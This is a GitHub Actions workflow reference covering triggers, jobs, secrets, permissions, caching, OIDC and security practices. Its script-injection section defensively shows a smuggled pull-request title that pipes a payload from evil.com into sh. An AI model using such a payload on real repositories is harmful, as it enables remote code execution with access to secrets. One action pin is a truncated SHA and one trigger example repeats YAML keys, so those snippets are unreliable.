# Writing GitHub Actions: Full Reference

## Contents

- [Workflow File Structure](#workflow-file-structure)
- [Triggers (on)](#triggers-on)
- [Jobs](#jobs)
- [Steps](#steps)
- [Runners](#runners)
- [Expressions and Contexts](#expressions-and-contexts)
- [Environment Variables and Secrets](#environment-variables-and-secrets)
- [Permissions](#permissions)
- [Concurrency](#concurrency)
- [Matrix Strategy](#matrix-strategy)
- [Caching](#caching)
- [Artifacts](#artifacts)
- [Outputs: Step and Job](#outputs-step-and-job)
- [Environments and Deployments](#environments-and-deployments)
- [Reusable Workflows](#reusable-workflows)
- [Composite Actions](#composite-actions)
- [OIDC Cloud Authentication](#oidc-cloud-authentication)
- [Security Best Practices](#security-best-practices)
- [actionlint Validation](#actionlint-validation)

---

## Workflow File Structure

```yaml
name: CI                          # shown in GitHub UI (optional)

on: [push, pull_request]          # trigger shorthand

permissions:                      # minimum permissions at workflow level
  contents: read

env:                              # workflow-level environment variables
  NODE_VERSION: "20"

jobs:
  build:                          # job ID (used in needs:, outputs:)
    name: Build and Test          # display name (optional)
    runs-on: ubuntu-24.04
    timeout-minutes: 15           # always set; default is 360 min

    steps:
      - name: Checkout
        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2

      - name: Run tests
        run: |
          npm ci
          npm test
```

---

## Triggers (on)

### Common Events

```yaml
on:
  push:
    branches: [main, "release/**"]
    branches-ignore: ["dependabot/**"]
    paths: ["src/**", "!src/**/*.md"]     # path filters
    tags: ["v*"]

  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened]  # default: opened,synchronize,reopened
    paths-ignore: ["docs/**", "*.md"]

  pull_request_target:            # runs in base repo context (access to secrets)
    types: [opened, synchronize]  # use with extreme caution for untrusted forks

  schedule:
    - cron: "0 9 * * 1-5"         # UTC; Monday–Friday 09:00

  workflow_dispatch:              # manual trigger with optional inputs
    inputs:
      environment:
        description: "Target environment"
        type: choice
        options: [dev, staging, prod]
        required: true
        default: dev
      dry_run:
        description: "Skip actual deployment"
        type: boolean
        default: false
      version:
        description: "Version to deploy"
        type: string
        required: false

  workflow_call:                  # called by another workflow (reusable)
    inputs:
      environment:
        type: string
        required: true
    secrets:
      DEPLOY_KEY:
        required: true
    outputs:
      deploy_url:
        description: "Deployed URL"
        value: ${{ jobs.deploy.outputs.url }}

  release:
    types: [published, created]

  workflow_run:                   # triggered when another workflow completes
    workflows: ["CI"]
    types: [completed]
    branches: [main]

  push:                           # can list multiple events at top level
  pull_request:
  workflow_dispatch:
```

### Filter Patterns

```yaml
# Glob patterns: * matches anything except /; ** matches including /
branches:
  - main
  - "feature/**"         # feature/foo, feature/foo/bar
  - "!dependabot/**"     # exclude (! must be after positive patterns)

paths:
  - "src/**"
  - "*.go"
  - "!**/*.md"           # exclude markdown changes
```

---

## Jobs

```yaml
jobs:
  test:
    name: Run Tests
    runs-on: ubuntu-24.04
    timeout-minutes: 20

    # Job-level permissions (override workflow-level)
    permissions:
      contents: read
      checks: write

    # Conditional execution
    if: github.event_name == 'push' || github.event.pull_request.draft == false

    # Sequential dependency
    needs: [lint, build]

    # Inherit secrets when calling reusable workflow
    # secrets: inherit

    # Fail fast: stop all matrix jobs if one fails (default true)
    # strategy.fail-fast: false

    # Environment: requires approval for protected environments
    environment:
      name: staging
      url: https://staging.example.com

    # Concurrency: cancel in-progress runs of same group
    concurrency:
      group: ${{ github.workflow }}-${{ github.ref }}
      cancel-in-progress: true

    # Outputs: expose values to downstream jobs
    outputs:
      artifact_id: ${{ steps.build.outputs.artifact_id }}

    # Services: sidecar containers
    services:
      postgres:
        image: postgres:16
        env:
          POSTGRES_PASSWORD: postgres
        ports:
          - 5432:5432
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5

    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2

  deploy:
    needs: test
    if: needs.test.result == 'success'
    runs-on: ubuntu-24.04
    steps:
      - run: echo "Deploy"
```

---

## Steps

```yaml
steps:
  # Use a published action
  - name: Checkout code
    uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
    with:
      fetch-depth: 0          # full history for git log / versioning
      token: ${{ secrets.GITHUB_TOKEN }}

  # Run a shell command
  - name: Build
    id: build                 # ID for referencing outputs and status
    run: |
      set -euo pipefail
      make build
      echo "artifact_id=$(cat dist/artifact.id)" >> "$GITHUB_OUTPUT"
    shell: bash
    working-directory: ./src
    env:
      BUILD_ENV: production

  # Conditional step
  - name: Deploy to prod
    if: github.ref == 'refs/heads/main' && github.event_name == 'push'
    run: make deploy

  # Always run (cleanup, reporting)
  - name: Upload results
    if: always()
    uses: actions/upload-artifact@65462800fd760344b1a7b4382951275a0abb4808  # v4.3.3
    with:
      name: test-results
      path: test-results/

  # Continue even if this step fails
  - name: Optional lint
    continue-on-error: true
    run: npm run lint

  # Timeout for a specific step
  - name: Long build
    timeout-minutes: 30
    run: make slow-build
```

---

## Runners

```yaml
# GitHub-hosted runners (ubuntu-latest is an alias — avoid in production)
runs-on: ubuntu-24.04          # pin to exact version for reproducibility
runs-on: ubuntu-22.04
runs-on: windows-2022
runs-on: macos-15
runs-on: macos-14              # Apple Silicon (M1)

# Large runners (require billing)
runs-on: ubuntu-24.04-16core

# Self-hosted runners
runs-on: [self-hosted, linux, x64]
runs-on: [self-hosted, macOS, arm64]

# Matrix-driven runner selection
runs-on: ${{ matrix.os }}
strategy:
  matrix:
    os: [ubuntu-24.04, windows-2022, macos-14]
```

---

## Expressions and Contexts

### Expression Syntax

```yaml
# Expressions: ${{ <expression> }}
# Used in: if, env, with, run (interpolation), needs, outputs

if: ${{ github.ref == 'refs/heads/main' }}
if: github.ref == 'refs/heads/main'      # ${{ }} optional in if:

# Operators
# == != < <= > >= && || !
# contains(search, item)
# startsWith(search, searchValue)
# endsWith(search, searchValue)
# format('{0} {1}', a, b)
# join(array, separator)
# toJSON(value)
# fromJSON(value)
# hashFiles('**/package-lock.json')

# Status check functions (in if:)
if: success()          # previous steps/jobs succeeded (default)
if: failure()          # previous step failed
if: cancelled()        # workflow was cancelled
if: always()           # always run regardless of status
```

### Contexts

```yaml
# github context
github.event_name          # push, pull_request, workflow_dispatch, etc.
github.ref                 # refs/heads/main or refs/tags/v1.0.0
github.ref_name            # main (short name)
github.sha                 # full commit SHA
github.actor               # user who triggered the workflow
github.repository          # owner/repo
github.run_id              # unique run ID
github.run_number          # sequential run number
github.workflow            # workflow name
github.job                 # current job ID
github.event               # full webhook event payload

# env context
env.MY_VAR                 # workflow/job/step-level env var

# secrets context
secrets.GITHUB_TOKEN       # auto-provisioned token
secrets.MY_SECRET          # user-defined secret

# vars context (non-sensitive configuration variables)
vars.MY_VAR                # repository/org variable (plaintext)

# inputs context (workflow_dispatch / workflow_call)
inputs.environment
inputs.dry_run

# needs context
needs.build.result         # success, failure, cancelled, skipped
needs.build.outputs.artifact_id

# steps context (within same job)
steps.build.outcome        # success, failure, cancelled, skipped
steps.build.conclusion     # same as outcome after completion
steps.build.outputs.artifact_id

# runner context
runner.os                  # Linux, Windows, macOS
runner.arch                # X64, ARM64
runner.temp                # temp directory path

# matrix context
matrix.os
matrix.node-version

# job context
job.status                 # success, failure, cancelled
```

### Writing to GITHUB_OUTPUT and GITHUB_ENV

```bash
# Set a step output (use in ${{ steps.<id>.outputs.<name> }})
echo "artifact_id=abc123" >> "$GITHUB_OUTPUT"

# Multi-line output
{
  echo "summary<<EOF"
  cat summary.txt
  echo "EOF"
} >> "$GITHUB_OUTPUT"

# Set environment variable for subsequent steps in same job
echo "MY_VAR=value" >> "$GITHUB_ENV"

# Append to PATH
echo "/opt/my-tool/bin" >> "$GITHUB_PATH"

# Write job summary (shown in GitHub UI)
echo "## Results" >> "$GITHUB_STEP_SUMMARY"
echo "Tests passed: 42" >> "$GITHUB_STEP_SUMMARY"
```

---

## Environment Variables and Secrets

```yaml
# Workflow-level env (available to all jobs and steps)
env:
  NODE_VERSION: "20"
  APP_NAME: my-app

jobs:
  build:
    # Job-level env (overrides workflow-level)
    env:
      BUILD_ENV: production

    steps:
      - name: Use secret safely
        # CORRECT: pass secret via env, reference as shell var in run
        env:
          API_KEY: ${{ secrets.API_KEY }}
        run: |
          curl -H "Authorization: Bearer $API_KEY" https://api.example.com

        # WRONG: interpolating secret directly into run string
        # run: curl -H "Authorization: Bearer ${{ secrets.API_KEY }}" ...
        # (this embeds the value into the workflow definition, visible in logs
        # if the expression is echoed by any tool)

      - name: Use repository variable (non-secret)
        run: echo "Deploying to ${{ vars.ENVIRONMENT }}"
```

---

## Permissions

```yaml
# Workflow-level: applies to all jobs (principle of least privilege)
permissions:
  contents: read          # default; read repo code
  actions: read
  checks: write           # needed to publish test results
  deployments: write      # needed for environment deployments
  id-token: write         # needed for OIDC
  issues: write
  packages: write         # needed to push to GHCR
  pull-requests: write    # needed to comment on PRs
  security-events: write  # needed for code scanning
  statuses: write

# Disable all permissions
permissions: {}

# Grant all permissions (avoid)
permissions: write-all

# Job-level permissions override workflow-level for that job only
jobs:
  publish:
    permissions:
      packages: write
      contents: read
```

**Permission scopes:** `read`, `write`, `none`

---

## Concurrency

```yaml
# Workflow-level: one run per group at a time
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true   # cancel older in-progress runs

# Job-level concurrency
jobs:
  deploy:
    concurrency:
      group: deploy-${{ github.ref }}
      cancel-in-progress: false  # don't cancel in-progress deploys

# Group by PR number for PR workflows
concurrency:
  group: pr-${{ github.event.pull_request.number }}
  cancel-in-progress: true
```

---

## Matrix Strategy

```yaml
jobs:
  test:
    strategy:
      fail-fast: false           # don't cancel other matrix jobs on failure
      max-parallel: 4            # limit concurrent jobs
      matrix:
        os: [ubuntu-24.04, windows-2022, macos-14]
        node: ["18", "20", "22"]
        exclude:
          - os: windows-2022
            node: "18"           # skip this combination
        include:
          - os: ubuntu-24.04
            node: "20"
            experimental: true   # add extra key to a specific combo

    runs-on: ${{ matrix.os }}
    name: Test on ${{ matrix.os }} / Node ${{ matrix.node }}

    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
      - uses: actions/setup-node@cdca7365b2dadb8aad0a33bc7601856ffabcc48e  # v4.3.0
        with:
          node-version: ${{ matrix.node }}
      - run: npm test
```

---

## Caching

```yaml
steps:
  - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2

  # Manual cache (most flexible)
  - name: Cache dependencies
    uses: actions/cache@5a3ec84eff668545e5b5963b5d32ed4f05f7e2e4  # v4.2.3
    with:
      path: ~/.npm
      key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}
      restore-keys: |
        ${{ runner.os }}-npm-

  # Built-in caching via setup actions (preferred when available)
  - uses: actions/setup-node@cdca7365b2dadb8aad0a33bc7601856ffabcc48e  # v4.3.0
    with:
      node-version: "20"
      cache: "npm"               # auto-caches ~/.npm keyed to package-lock.json

  - uses: actions/setup-python@42375524879713f22e7e80b7c5d6b62649eaf95  # v5.4.0
    with:
      python-version: "3.12"
      cache: "pip"

  - uses: actions/setup-go@0aaccfd150d50ccaeb58ebd88d36e91967a5f35b  # v5.4.0
    with:
      go-version: "1.22"
      cache: true                # auto-caches go module cache
```

---

## Artifacts

```yaml
steps:
  # Upload artifact
  - name: Upload build output
    uses: actions/upload-artifact@65462800fd760344b1a7b4382951275a0abb4808  # v4.3.3
    with:
      name: build-output-${{ github.sha }}
      path: |
        dist/
        !dist/**/*.map            # exclude source maps
      retention-days: 7           # default 90; max 90
      if-no-files-found: error    # error | warn | ignore (default warn)

  # Upload test results
  - name: Upload test results
    if: always()                  # upload even when tests fail
    uses: actions/upload-artifact@65462800fd760344b1a7b4382951275a0abb4808  # v4.3.3
    with:
      name: test-results
      path: test-results/junit.xml

# Download artifact in another job
jobs:
  deploy:
    needs: build
    steps:
      - name: Download build output
        uses: actions/download-artifact@fa0a91b85d4f404e444306234036836ebe37a218  # v4.1.8
        with:
          name: build-output-${{ github.sha }}
          path: dist/
```

---

## Outputs: Step and Job

```yaml
jobs:
  build:
    runs-on: ubuntu-24.04
    outputs:
      version: ${{ steps.get_version.outputs.version }}
      image_tag: ${{ steps.build.outputs.image_tag }}

    steps:
      - name: Get version
        id: get_version
        run: echo "version=$(cat VERSION)" >> "$GITHUB_OUTPUT"

      - name: Build image
        id: build
        run: |
          TAG="sha-${{ github.sha }}"
          docker build -t myapp:$TAG .
          echo "image_tag=$TAG" >> "$GITHUB_OUTPUT"

  deploy:
    needs: build
    runs-on: ubuntu-24.04
    steps:
      - name: Deploy
        run: |
          echo "Deploying version ${{ needs.build.outputs.version }}"
          echo "Image: ${{ needs.build.outputs.image_tag }}"
```

---

## Environments and Deployments

```yaml
jobs:
  deploy-prod:
    runs-on: ubuntu-24.04
    environment:
      name: production
      url: https://example.com   # shown as deployment link in GitHub UI

    # Environment-scoped secrets are available here
    steps:
      - name: Deploy
        env:
          PROD_KEY: ${{ secrets.PROD_DEPLOY_KEY }}   # env-scoped secret
        run: ./deploy.sh
```

Configure in GitHub: Settings → Environments → Add protection rules:
- Required reviewers
- Wait timer
- Branch restrictions (only `main` can deploy to prod)

---

## Reusable Workflows

```yaml
# .github/workflows/deploy.yml — reusable workflow
on:
  workflow_call:
    inputs:
      environment:
        type: string
        required: true
      image_tag:
        type: string
        required: true
    secrets:
      DEPLOY_KEY:
        required: true
    outputs:
      deploy_url:
        description: "URL of deployed environment"
        value: ${{ jobs.deploy.outputs.url }}

jobs:
  deploy:
    runs-on: ubuntu-24.04
    outputs:
      url: ${{ steps.deploy.outputs.url }}
    environment: ${{ inputs.environment }}
    steps:
      - name: Deploy
        id: deploy
        env:
          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
        run: |
          ./deploy.sh ${{ inputs.environment }} ${{ inputs.image_tag }}
          echo "url=https://${{ inputs.environment }}.example.com" >> "$GITHUB_OUTPUT"

---
# .github/workflows/cd.yml — caller workflow
on:
  push:
    branches: [main]

jobs:
  build:
    uses: ./.github/workflows/build.yml

  deploy-staging:
    needs: build
    uses: ./.github/workflows/deploy.yml
    with:
      environment: staging
      image_tag: ${{ needs.build.outputs.image_tag }}
    secrets:
      DEPLOY_KEY: ${{ secrets.STAGING_DEPLOY_KEY }}

  deploy-prod:
    needs: deploy-staging
    uses: ./.github/workflows/deploy.yml
    with:
      environment: production
      image_tag: ${{ needs.build.outputs.image_tag }}
    secrets: inherit              # pass all secrets from caller
```

**Constraints:**
- Reusable workflows must be in the same repo or a public/shared repo.
- Max nesting depth: 4 levels.
- `jobs.<id>.uses` cannot be combined with `jobs.<id>.steps` in the same job.

---

## Composite Actions

```yaml
# .github/actions/setup-app/action.yml
name: Setup App
description: Install dependencies and configure the environment
author: myorg

inputs:
  node-version:
    description: "Node.js version to use"
    required: false
    default: "20"
  cache-key:
    description: "Additional cache key suffix"
    required: false

outputs:
  cache-hit:
    description: "Whether cache was restored"
    value: ${{ steps.cache.outputs.cache-hit }}

runs:
  using: composite           # composite (shell steps) vs docker vs javascript
  steps:
    - uses: actions/setup-node@cdca7365b2dadb8aad0a33bc7601856ffabcc48e  # v4.3.0
      with:
        node-version: ${{ inputs.node-version }}
        cache: npm

    - name: Install dependencies
      shell: bash
      run: npm ci

    - name: Verify installation
      shell: bash              # shell is REQUIRED in composite action steps
      run: node --version
```

```yaml
# Calling the composite action
steps:
  - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
  - uses: ./.github/actions/setup-app   # relative path from repo root
    with:
      node-version: "20"
```

---

## OIDC Cloud Authentication

Avoid long-lived credentials. Use OIDC to assume cloud roles directly.

### AWS OIDC

```yaml
permissions:
  id-token: write       # required for OIDC token
  contents: read

steps:
  - name: Configure AWS credentials
    uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502  # v4.0.2
    with:
      role-to-assume: arn:aws:iam::123456789012:role/github-actions
      aws-region: us-east-1
      role-session-name: github-actions-${{ github.run_id }}

  - name: Deploy
    run: aws s3 sync dist/ s3://my-bucket/
```

AWS trust policy for the role:
```json
{
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
      "token.actions.githubusercontent.com:sub": "repo:org/repo:ref:refs/heads/main"
    }
  }
}
```

### GCP OIDC

```yaml
permissions:
  id-token: write
  contents: read

steps:
  - uses: google-github-actions/auth@71f986410dfbc7added4569d411d040a91dc6935  # v2.1.3
    with:
      workload_identity_provider: projects/123/locations/global/workloadIdentityPools/github/providers/github
      service_account: github-actions@my-project.iam.gserviceaccount.com

  - uses: google-github-actions/setup-gcloud@6189d56e4096ee891640bb02ac264be376592d6a  # v2.1.2
```

---

## Security Best Practices

### Script Injection Prevention

```yaml
# VULNERABLE: attacker-controlled data in expression interpolated into run:
- name: Greet user (UNSAFE)
  run: echo "Hello ${{ github.event.pull_request.title }}"
  # PR title can contain: "; curl https://evil.com/payload | sh; #"

# SAFE: pass attacker-controlled values only through environment variables
- name: Greet user (SAFE)
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Hello $PR_TITLE"
  # Shell treats $PR_TITLE as a value, not code
```

### pull_request_target Safety

```yaml
# DANGEROUS: checking out untrusted fork code and running it with secrets access
on:
  pull_request_target:
jobs:
  test:
    steps:
      - uses: actions/checkout@...
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # DANGEROUS with secrets
      - run: npm test   # runs attacker's code with elevated permissions

# SAFE pattern: use pull_request (not pull_request_target) for untrusted forks
# Use pull_request_target only for trusted collaborators or when NOT running code
```

### Third-Party Action Pinning

```yaml
# INSECURE: tag can be moved to point to malicious code
- uses: actions/checkout@v4

# SECURE: commit SHA is immutable
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
```

---

## actionlint Validation

```bash
# Install actionlint
brew install actionlint           # macOS
go install github.com/rhysd/actionlint/cmd/actionlint@latest

# Validate all workflows in repo
actionlint

# Validate specific file
actionlint .github/workflows/ci.yml

# Check with shellcheck integration (recommended)
actionlint -shellcheck shellcheck

# In CI
- name: Validate workflows
  uses: rbrto/action-actionlint@...
  # OR
  run: actionlint
```

**actionlint catches:**
- Invalid event names and property access
- Wrong context/expression syntax
- `needs` referencing non-existent jobs
- Missing required action inputs
- Shell script errors (via shellcheck integration)
- Type errors in expressions
